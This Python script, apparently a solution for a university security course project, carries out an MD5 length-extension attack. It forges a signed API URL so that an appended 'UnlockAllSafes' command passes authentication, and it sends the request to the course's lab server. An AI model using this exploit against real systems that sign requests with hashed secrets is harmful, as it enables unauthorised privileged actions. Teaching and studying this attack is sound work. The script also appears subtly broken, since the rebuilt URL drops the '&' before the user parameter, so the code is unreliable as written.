import http.client as httplib
from urllib.parse import urlparse, quote
import sys, re
from pymd5 import md5, padding
#url = sys.argv[1]

# Initialize our attack parameter
attack = "&command3=UnlockAllSafes"

#TODO: Remove
url = "http://cs4440.eng.utah.edu/project1/api?token=402a574d265dc212ee64970f159575d0&user=admin&command1=ListFiles&command2=NoOp"

#URL has the format http://cs4440.eng.utah.edu/project1/api?token=402a574d265dc212ee64970f159575d0&user=admin&command1=ListFiles&command2=NoOp
#First, extract the token from the URL
token = re.search('token=(.+?)&', url).group(1)
print("Token: " + token)

# Extract the rest of the URL parameters as a string
params = url.split("&", 1)[1]
print("Params: ", params)

# Get the padding for params plus 8 characters
padding = padding(64 + len(params) * 8)
print("Padding: '", quote(padding), "'")

# Compute total length in bits to for hash init 
bits = 64 + len(params + padding) * 8
print("Bits: ", bits)

# Calculate new hash
h = md5(state=token, count=bits)
h.update(attack)

# Calc new url
url = url.split("?")[0] + "?token=" + h.hexdigest() + params + quote(padding) + attack
print("New URL: ", url)


parsedUrl = urlparse(url)
conn = httplib.HTTPConnection(parsedUrl.hostname,parsedUrl.port)
conn.request("GET", parsedUrl.path + "?" + parsedUrl.query)
print(conn.getresponse().read())
